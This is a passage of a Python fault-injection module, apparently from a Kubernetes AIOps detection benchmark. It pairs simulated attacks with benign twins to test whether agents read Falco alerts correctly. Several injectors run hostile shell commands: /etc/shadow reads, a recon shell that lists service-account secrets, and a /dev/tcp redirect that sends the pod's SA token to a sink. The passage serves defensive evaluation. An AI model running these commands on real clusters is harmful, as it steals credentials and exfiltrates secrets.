        print(f"[security_runtime] stopped host loop [{_HOST_LOOP_MARKER}] | ns: {self.namespace}")

    # SR.7 - benign_cpu_job (BENIGN TWIN of crypto_miner, detected=False): S7's RQ2 control,
    # named explicitly in DETECTION_BENCHMARK_PLAN.md §6.5 ("a real CPU-heavy job vs a
    # crypto-miner"). A legitimate batch analytics/compression job: the SAME mechanism, the same
    # single pegged core in the same pod, minus every miner-specific string.
    #
    # Read the twin-doctrine at the top of this file carefully before judging this one: the other
    # twins here share a FALCO rule with their attack, because for those pairs Falco is the only
    # surface and a twin that fires nothing is just a second no-op. This pair shares a TELEMETRY
    # signature instead — identical CPU shape — and is silent on Falco by design. The agent it
    # tests is the one that reasons "sustained CPU spike -> compromised workload"; that agent
    # false-positives here. An agent reading Falco separates the halves immediately, which is the
    # point: it is the measurement of how much the runtime surface is worth on a fault where the
    # telemetry surface is genuinely misleading.
    def inject_benign_cpu_job(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            # No stratum URI, and a process name that is on neither `miner_binaries` nor
            # `shell_binaries` — the latter so it cannot pick up a shell rule the attack lacks.
            action = self._cpu_loop_action(
                _CPU_JOB_EXE, _CPU_JOB_MARKER,
                "JOB=nightly-rollup; LEVEL=9; OUT=/tmp/rollup.gz",
            )
            self._start_host_loop(pod, action)
            print(f"[security_runtime] BENIGN CPU-heavy batch job (proc={_CPU_JOB_EXE}, 1 core, "
                  f"re-exec every 8s) in pod {pod} ({service}) | ns: {self.namespace}")
            # The twin's claim is a NEGATIVE one, so verify the negative.
            self._verify_falco_silent(
                self._MINER_RULES + self._MINER_RULES_SHADOWED, pod)

    def recover_benign_cpu_job(self, microservices: list[str] = None):
        self._stop_host_loops()
        print(f"[security_runtime] stopped host loop [{_HOST_LOOP_MARKER}] | ns: {self.namespace}")

    # SR.2 - transient_read: TRANSIENT credential theft — the clean "coverage" fault (base blind).
    def inject_transient_read(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            self._start_host_loop(pod, "cat /etc/shadow")
            print(f"[security_runtime] MALICIOUS transient /etc/shadow reads against pod {pod} "
                  f"({service}) via host loop | ns: {self.namespace}")
            self._verify_falco(["Read sensitive file untrusted"], pod)

    def recover_transient_read(self, microservices: list[str] = None):
        self._stop_host_loops()
        print(f"[security_runtime] stopped host loop [{_HOST_LOOP_MARKER}] | ns: {self.namespace}")

    # SR.3 - attacker_shell (ATTACK, detected=True): the malicious half of the RQ2 matched pair.
    # An interactive (TTY) shell in the app container that does recon AND steals credentials.
    # Fires BOTH "Terminal shell in container" (shared with the benign twin) and "Read sensitive
    # file untrusted" (unique to the attack) — so the shell alert alone is NOT sufficient evidence,
    # and the agent has to look at what the shell did. Non-breaking: every command is read-only.
    _ATTACKER_SHELL_RULES = ["Terminal shell in container", "Read sensitive file untrusted"]
    _BENIGN_SHELL_RULES = ["Terminal shell in container"]

    def inject_attacker_shell(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            # recon + credential theft; `sh -c` keeps the spawned process a shell_binary with
            # runc as its parent, which is what "Terminal shell in container" matches on.
            self._start_host_loop(
                pod,
                "sh -c 'id; hostname; cat /etc/shadow; ls -la /var/run/secrets/kubernetes.io/serviceaccount'",
                tty=True,
            )
            print(f"[security_runtime] ATTACKER interactive shell (recon + /etc/shadow) on pod {pod} "
                  f"({service}) via host loop | ns: {self.namespace}")
            self._verify_falco(self._ATTACKER_SHELL_RULES, pod)

    def recover_attacker_shell(self, microservices: list[str] = None):
        self._stop_host_loops()
        print(f"[security_runtime] stopped host loop [{_HOST_LOOP_MARKER}] | ns: {self.namespace}")

    # SR.4 - benign_admin_shell (BENIGN TWIN of attacker_shell, detected=False): an operator debug
    # session — an interactive (TTY) shell running harmless diagnostics. Fires exactly ONE of the
    # attack's two rules: "Terminal shell in container", identical rule and priority, same pod.
    # It does NOT touch a sensitive file, so "Read sensitive file untrusted" stays silent.
    # RQ2 specificity: an agent that treats any shell-in-container alert as an intrusion produces a
    # false positive here; one that checks what the shell actually did gets both halves right.
    def inject_benign_admin_shell(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            self._start_host_loop(
                pod,
                "sh -c 'id; uname -a; ls -la /tmp; cat /etc/os-release; df -h'",
                tty=True,
            )
            print(f"[security_runtime] BENIGN admin debug shell (diagnostics) on pod {pod} "
                  f"({service}) via host loop | ns: {self.namespace}")
            # The twin is only a twin if it really fires the shared rule — verify, don't assume.
            self._verify_falco(self._BENIGN_SHELL_RULES, pod)

    def recover_benign_admin_shell(self, microservices: list[str] = None):
        self._stop_host_loops()

    # SR.5 - benign_secret_read (BENIGN TWIN of attacker_shell, detected=False): an operator/workload
    # session that legitimately touches its OWN credentials — the SA token mounted into the pod.
    #
    # Why it is delivered through a TTY shell: Falco's `sensitive_files` macro covers /etc/shadow,
    # /etc/sudoers and /etc/pam.* — NOT /var/run/secrets/... — so reading the token fires no rule
    # of its own. Read alone (the original form of this injector) it therefore fired NOTHING and
    # was behaviourally a second no-op rather than a specificity test. Running it inside an
    # interactive shell makes it fire "Terminal shell in container", the SAME rule (same priority,
    # same pod) as the attack half `attacker_shell` — so it becomes a real twin.
    #
    # This makes it a HARDER twin than benign_admin_shell: both halves of this pair now show
    # "shell + credential access", and the discriminator is WHOSE credentials — the attack reads
    # /etc/shadow (fires "Read sensitive file untrusted" on top), this reads only the pod's own
    # mounted token. An agent that flags "shell touched a credential" produces a false positive here.
    #
    # Note the rule no longer depends on the token being readable: the shell itself is what fires.
    def inject_benign_secret_read(self, microservices: list[str]):
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            self._start_host_loop(
                pod,
                "sh -c 'id; cat /var/run/secrets/kubernetes.io/serviceaccount/token; "
                "ls -la /var/run/secrets/kubernetes.io/serviceaccount'",
                tty=True,
            )
            print(f"[security_runtime] BENIGN own-SA-token read (interactive session) on pod {pod} "
                  f"({service}) via host loop | ns: {self.namespace}")
            # Same verification contract as every other runtime injector: a twin that does not fire
            # the shared rule is not a twin, and a silently-silent twin is a mislabelled episode.
            self._verify_falco(self._BENIGN_SHELL_RULES, pod)

    def recover_benign_secret_read(self, microservices: list[str] = None):
        self._stop_host_loops()

    # ---- S4 data-exfil egress: shared sink infrastructure -------------------------------------
    # Both sinks are deployed by BOTH halves so the cluster state is identical across the pair and
    # the only variable is the loop's action. The listener stores nothing — it accepts and drains,
    # which is all that is needed for the client's connect+dup (and hence the Falco rule) to fire.
    def _sink_listener_src(self) -> str:
        # A bare accept-and-drain loop. The manifest is piped to kubectl via STDIN (not `echo`),
        # so the newlines survive: `echo '<json>'` under /bin/sh (dash) would expand the JSON's
        # `\n` escapes and YAML double-quoted line-folding would then collapse them to spaces,
        # flattening this into one line and breaking `python3 -c`. See _ensure_sinks.
        return (
            "import socket\n"
            "s=socket.socket()\n"
            "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n"
            f"s.bind((\"0.0.0.0\",{_EXFIL_SINK_PORT}))\n"
            "s.listen(64)\n"
            "while True:\n"
            "    c,a=s.accept()\n"
            "    try:\n"
            "        while c.recv(65536):\n"
            "            pass\n"
            "    except OSError:\n"
            "        pass\n"
            "    c.close()\n"
        )

    def _sink_objects(self, name: str) -> list[dict]:
        labels = {"app": name, _EXFIL_SINK_LABEL: "true"}
        pod = {
            "apiVersion": "v1", "kind": "Pod",
            "metadata": {"name": name, "namespace": self.namespace, "labels": labels},
            "spec": {
                # No SA token mounted: the sink has no reason for one, and it trims one class of
                # the sink's own startup noise.
                "automountServiceAccountToken": False,
                "containers": [{
                    "name": "sink",
                    "image": _EXFIL_SINK_IMAGE,
                    "command": ["python3", "-c", self._sink_listener_src()],
                    "ports": [{"containerPort": _EXFIL_SINK_PORT}],
                }],
            },
        }
        svc = {
            "apiVersion": "v1", "kind": "Service",
            "metadata": {"name": name, "namespace": self.namespace,
                         "labels": {_EXFIL_SINK_LABEL: "true"}},
            "spec": {"selector": {"app": name},
                     "ports": [{"port": _EXFIL_SINK_PORT, "targetPort": _EXFIL_SINK_PORT}]},
        }
        return [pod, svc]

    def _ensure_sinks(self):
        """Deploy both collectors (idempotent) and block until they are Ready.

        The loop's `> /dev/tcp/<sink>/<port>` only dups the socket if `connect` succeeds, so the
        Falco rule cannot fire — and `_verify_falco` would then wrongly raise — unless the sink is
        actually accepting first. Hence the readiness wait before any loop starts.
        """
        manifest = json.dumps({
            "apiVersion": "v1", "kind": "List",
            "items": self._sink_objects(_EXFIL_ATTACK_SINK) + self._sink_objects(_EXFIL_TWIN_SINK),
        })
        # Pipe via STDIN, NOT `echo '<json>'` — see _sink_listener_src for why the multiline
        # python source would otherwise be flattened by dash-echo + YAML line-folding.
        self.kubectl.exec_command("kubectl apply -f -", input_data=manifest)
        for name in (_EXFIL_ATTACK_SINK, _EXFIL_TWIN_SINK):
            self.kubectl.exec_command(
                f"kubectl wait --for=condition=Ready pod -l app={name} "
                f"-n {self.namespace} --timeout=120s"
            )
        print(f"[security_runtime] exfil sinks ready: {_EXFIL_ATTACK_SINK}, {_EXFIL_TWIN_SINK} "
              f"| ns: {self.namespace}")

    def _delete_sinks(self):
        self.kubectl.exec_command(
            f"kubectl delete pod,svc -l {_EXFIL_SINK_LABEL}=true "
            f"-n {self.namespace} --ignore-not-found"
        )

    # SR.8 - exfil_egress (ATTACK, detected=True): S4. A rogue transient process ships a real
    # credential (the mounted SA token) out to the unlisted collector over a fresh plaintext TCP
    # connection. `> /dev/tcp/...` dups the socket -> fires "Redirect STDOUT/STDIN to Network
    # Connection in Container", and ONLY that (the SA token is not in Falco's sensitive_files, so
    # there is no second rule — kept single-signature so the pair stays matched).
    def inject_exfil_egress(self, microservices: list[str]):
        self._ensure_sinks()
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            self._start_host_loop(
                pod,
                f"bash -c 'cat {_EXFIL_ATTACK_SOURCE} > /dev/tcp/{_EXFIL_ATTACK_SINK}/{_EXFIL_SINK_PORT}'",
            )
            print(f"[security_runtime] DATA EXFIL: SA token -> {_EXFIL_ATTACK_SINK}:{_EXFIL_SINK_PORT} "
                  f"from pod {pod} ({service}) via host loop | ns: {self.namespace}")
            self._verify_falco([_EXFIL_RULE_REDIRECT], pod)

    def recover_exfil_egress(self, microservices: list[str] = None):
        self._stop_host_loops()
        self._delete_sinks()
        print(f"[security_runtime] stopped exfil loop [{_HOST_LOOP_MARKER}] and removed sinks "
              f"| ns: {self.namespace}")

    # SR.9 - benign_telemetry_egress (BENIGN TWIN of exfil_egress, detected=False): the SAME
    # mechanism and the SAME Falco rule, shipping innocuous uptime telemetry to the DOCUMENTED
    # collector. The discriminator is the source (proc.cmdline: /proc/uptime vs the SA token) and
    # the destination Service — not the alert, which is identical. An agent that flags any outbound
    # redirect as exfil false-positives here.
    def inject_benign_telemetry_egress(self, microservices: list[str]):
        self._ensure_sinks()
        for service in microservices:
            pod = self._first_pod(service)
            if not pod:
                print(f"[security_runtime] no running pod for '{service}' in {self.namespace} — skipped")
                continue
            self._start_host_loop(
                pod,
                f"bash -c 'cat {_EXFIL_TWIN_SOURCE} > /dev/tcp/{_EXFIL_TWIN_SINK}/{_EXFIL_SINK_PORT}'",
            )
            print(f"[security_runtime] BENIGN telemetry egress: uptime -> {_EXFIL_TWIN_SINK}:{_EXFIL_SINK_PORT} "
                  f"from pod {pod} ({service}) via host loop | ns: {self.namespace}")
            # A real twin fires the shared rule — verify it, same contract as every runtime twin.
            self._verify_falco([_EXFIL_RULE_REDIRECT], pod)

    def recover_benign_telemetry_egress(self, microservices: list[str] = None):
        self._stop_host_loops()
        self._delete_sinks()


if __name__ == "__main__":
    # Smoke-test one injector against a live cluster. Because every inject_* here verifies itself
    # against Falco and RAISES on failure, a clean exit IS the verification — there is nothing to
    # assert afterwards.
    #
    #   python -m aiopslab.generators.fault.security_runtime [FAULT] [NAMESPACE] [SERVICE]
    #
    # S7 (needs the SANDBOX ruleset loaded — see the module docstring):
    #   ... security_runtime crypto_miner    test-hotel-reservation user
    #   ... security_runtime benign_cpu_job  test-hotel-reservation user
    # The pair is only meaningful run BOTH ways: the attack must fire the miner rule and the twin
    # must not, and only the second of those is a claim you can get wrong without noticing.
    import sys

    fault = sys.argv[1] if len(sys.argv) > 1 else "rogue_shell"
    namespace = sys.argv[2] if len(sys.argv) > 2 else "test-social-network"
    service = sys.argv[3] if len(sys.argv) > 3 else "user-service"

    injector = SecurityRuntimeInjector(namespace)
    injector._inject(fault_type=fault, microservices=[service])
    print(f"[smoke] {fault} injected and verified in {namespace}/{service}")
    input("[smoke] press enter to recover... ")
    injector._recover(fault_type=fault, microservices=[service])
